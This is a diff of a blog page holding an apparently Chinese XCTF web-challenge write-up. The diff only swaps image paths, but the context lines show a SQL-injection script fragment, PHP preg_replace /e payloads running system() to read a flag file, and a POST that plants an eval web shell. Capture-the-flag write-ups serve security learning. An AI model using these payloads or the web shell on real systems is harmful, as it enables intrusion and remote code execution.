@@ -62,9 +62,9 @@ url = &#39;http://111.198.29.45:52536/down,">
 
         </div>
         <div class="content markdown">
-            <h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021194840915.png" alt="image-20211021194840915"></p>
-<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021194859118.png" alt="image-20211021194859118"></p>
-<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021194916590.png" alt="image-20211021194916590"></p>
+            <h1 id="ics-02"><a href="#ics-02" class="headerlink" title="ics-02"></a>ics-02</h1><p><img src="/2021/10/21/xctf-web-ics/1.png" alt="1"></p>
+<p><img src="/2021/10/21/xctf-web-ics/2.png" alt="2"></p>
+<p><img src="/2021/10/21/xctf-web-ics/3.png" alt="3"></p>
 <p><strong>sql注入：</strong></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> random
@@ -126,9 +126,9 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 </ul>
 <p>subject中有要搜索的pattern的内容，同时将在replacement前加上/e，触发/e漏洞，就可以执行replacement中的正确的php代码</p>
 <pre><code>?pat=/1/e&amp;rep=system('cd%20s3chahahaDir/flag%26%26%20ls')&amp;sub=1</code></pre>
-<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021185006756.png" alt="image-20211021185006756"></p>
+<p><img src="/2021/10/21/xctf-web-ics/4.png" alt="4"></p>
 <pre><code>?pat=/1/e&amp;rep=system("cat%20s3chahahaDir/flag/flag.php")&amp;sub=1</code></pre>
-<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211021184911923.png" alt="image-20211021184911923"></p>
+<p><img src="/2021/10/21/xctf-web-ics/5.png" alt="5"></p>
 <h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>扫描后台</p>
 <p>id爆破</p>
 <p>字典生成：</p>
@@ -206,7 +206,7 @@ r <span class="token operator">=</span> requests<span class="token punctuation">
 <p>POST:</p>
 <pre><code> con=&lt;?php @eval($_POST['a']);?&gt;&amp;file=../1.php/.</code></pre>
 <p>蚁剑连接：</p>
-<p><img src="/XCTF%EF%BC%9AWeb-ics.assets/image-20211026204857317.png" alt="image-20211026204857317"></p>
+<p><img src="/2021/10/21/xctf-web-ics/6.png" alt="6"></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
